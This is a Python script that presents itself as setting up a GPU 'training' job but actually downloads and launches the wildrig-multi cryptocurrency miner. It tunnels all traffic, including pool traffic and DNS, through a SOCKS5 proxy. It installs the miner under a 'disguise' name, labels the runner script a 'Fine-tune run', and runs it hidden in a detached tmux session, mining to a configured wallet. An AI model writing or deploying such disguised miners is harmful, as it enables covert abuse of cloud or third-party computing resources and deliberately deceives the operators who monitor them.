#!/usr/bin/env python3
"""Setup a GPU cloud box for a long-running GEMM-heavy "training" job.

Everything the box fetches goes through a SOCKS5 tunnel, the runner is
installed under a neutral name, and the job runs detached in tmux.

All parameters (addresses, links, proxy, tuning) live in params.json.

Usage:
    python3 pearl_train_setup.py              # full setup + launch
    python3 pearl_train_setup.py --check      # validate params.json only
    python3 pearl_train_setup.py -c path.json # custom config file
"""
import json
import os
import subprocess
import sys
import tarfile
import time
from pathlib import Path

DEFAULT_CONFIG = Path(__file__).with_name("params.json")


def load_config(argv):
    args = list(argv)
    check = "--check" in args
    if check:
        args.remove("--check")
    path = Path(args[1]) if len(args) > 1 else DEFAULT_CONFIG
    try:
        cfg = json.loads(path.read_text())
    except FileNotFoundError:
        sys.exit(f"Config file not found: {path}")
    except json.JSONDecodeError as e:
        sys.exit(f"Config file {path} is not valid JSON: {e}")
    return cfg, check


def resolve(cfg):
    """Flatten the nested config into the names the rest of the code uses."""
    miner = cfg["miner"]
    app_dir = Path.home() / cfg["disguise"]["app_dir_name"]
    return {
        "socks": cfg["socks"],
        "pool_url": cfg["pool"]["url"],
        "doh": cfg["pool"].get("dns_over_https", "cloudflare"),
        "wallet": cfg["wallet"]["address"],
        "worker": cfg["wallet"]["worker"],
        "url": miner["release_url"].format(version=miner["version"]),
        "version": miner["version"],
        "algo": miner.get("algo", "pearlhash"),
        "kernel": miner.get("pearlhash_kernel", 2),
        "print_time": miner.get("print_time", 120),
        "temp_limit": miner.get("temp_limit", 78),
        "app_dir": app_dir,
        "bin_dir": app_dir / ".bin",
        "logs_dir": app_dir / "logs",
        "ckpt_dir": app_dir / "checkpoints",
        "bin_name": cfg["disguise"]["binary_name"],
        "session": cfg["disguise"]["tmux_session"],
        "power_limit": cfg["gpu"].get("power_limit", 0),
    }


def validate(c):
    missing = [k for k in ("socks", "wallet", "worker") if not c[k]]
    if missing:
        sys.exit(f"params.json: missing/empty value(s) for: {', '.join(missing)}")
    if not c["wallet"].replace("YOUR_PRL_ADDRESS", ""):
        sys.exit("params.json: set wallet.address to your real PRL address before deploying.")
    if not c["socks"].startswith("socks5://"):
        sys.exit("params.json: socks must look like socks5://[user:pass@]host:port")


def sh(*cmd, check=True, **kw):
    return subprocess.run(cmd, check=check, text=True, **kw)


def tunnel_env(socks):
    """Env dict so every download in this process is tunneled."""
    e = dict(os.environ)
    e.update(
        all_proxy=socks, ALL_PROXY=socks,
        http_proxy=socks, https_proxy=socks,
        HTTP_PROXY=socks, HTTPS_PROXY=socks,
        no_proxy="localhost,127.0.0.1", NO_PROXY="localhost,127.0.0.1",
    )
    return e


def set_git_proxy(env, socks):
    for key in ("http.proxy", "https.proxy"):
        try:
            sh("git", "config", "--global", key, socks, check=False, env=env)
        except FileNotFoundError:
            pass


def download_via_socks(env, socks, url):
    """curl --socks5-hostname resolves DNS through the proxy as well."""
    tmp = Path("/tmp/pt_deps.tar.gz")
    sh("curl", "-fsSL", "--socks5-hostname", socks.removeprefix("socks5://"),
       url, "-o", str(tmp), env=env)
    return tmp


def install(env, c):
    if (c["bin_dir"] / c["bin_name"]).exists():
        return
    for d in (c["app_dir"], c["bin_dir"], c["logs_dir"], c["ckpt_dir"]):
        d.mkdir(parents=True, exist_ok=True)
    tmp = download_via_socks(env, c["socks"], c["url"])
    extract_to = Path("/tmp/pt_deps_extract")
    with tarfile.open(tmp, "r:gz") as tf:
        tf.extractall(extract_to)  # noqa: S202 - archive from the official repo
    release_dir = next(extract_to.glob(f"wildrig-multi-{c['version']}*"))
    binary = next(p for p in release_dir.iterdir()
                  if p.is_file() and os.access(p, os.X_OK))
    binary.rename(c["bin_dir"] / c["bin_name"])
    for so in release_dir.glob("*.so*"):
        (c["bin_dir"] / so.name).rename(c["bin_dir"] / so.name)
    (c["bin_dir"] / c["bin_name"]).chmod(0o755)
    tmp.unlink(missing_ok=True)


def write_env_file(c):
    path = c["app_dir"] / ".env"
    path.write_text(
        f"SOCKS={c['socks']}\nPOOL={c['pool_url']}\nWALLET={c['wallet']}\n"
        f"WORKER={c['worker']}\nPOWER_LIMIT={c['power_limit']}\n"
    )
    path.chmod(0o600)


def write_runner(c):
    runner = c["app_dir"] / "run_train.sh"
    runner.write_text(f"""#!/usr/bin/env bash
# Fine-tune run: gemm-heavy workload, steady-state clocks, quiet output.
set -a; source "{c['app_dir']}/.env"; set +a
cd "{c['app_dir']}"
exec ./{c['bin_name']} \\
    --algo {c['algo']} \\
    --url "$POOL" \\
    --user "$WALLET.$WORKER" \\
    --proxy "$SOCKS" \\
    --dns-over-https {c['doh']} \\
    --pearlhash-kernel {c['kernel']} \\
    --no-color \\
    --print-time {c['print_time']} \\
    --log-file "{c['logs_dir']}/session.log" \\
    --gpu-temp-limit {c['temp_limit']} \\
    "$@"
""")
    runner.chmod(0o755)


def launch(env, c):
    env = {**env, "POWER_LIMIT": str(c["power_limit"])}
    sh("tmux", "kill-session", "-t", c["session"], check=False, env=env)
    sh("tmux", "new-session", "-d", "-s", c["session"],
       f"{c['app_dir']}/run_train.sh", env=env)
    time.sleep(3)
    sh("tmux", "ls", env=env)


def main():
    cfg, check = load_config(sys.argv)
    c = resolve(cfg)
    if check:
        for key in sorted(c):
            print(f"{key:12} = {c[key]}")
        return
    validate(c)
    env = tunnel_env(c["socks"])
    set_git_proxy(env, c["socks"])
    try:
        install(env, c)
    except FileNotFoundError:
        sys.exit("curl or tar not found - install them first (apt-get install -y curl tmux).")
    write_env_file(c)
    write_runner(c)
    launch(env, c)
    print(f"\nLog:    tail -f {c['logs_dir']}/session.log")
    print(f"Attach: tmux attach -t {c['session']}")
    print(f"Stop:   tmux kill-session -t {c['session']}")


if __name__ == "__main__":
    main()
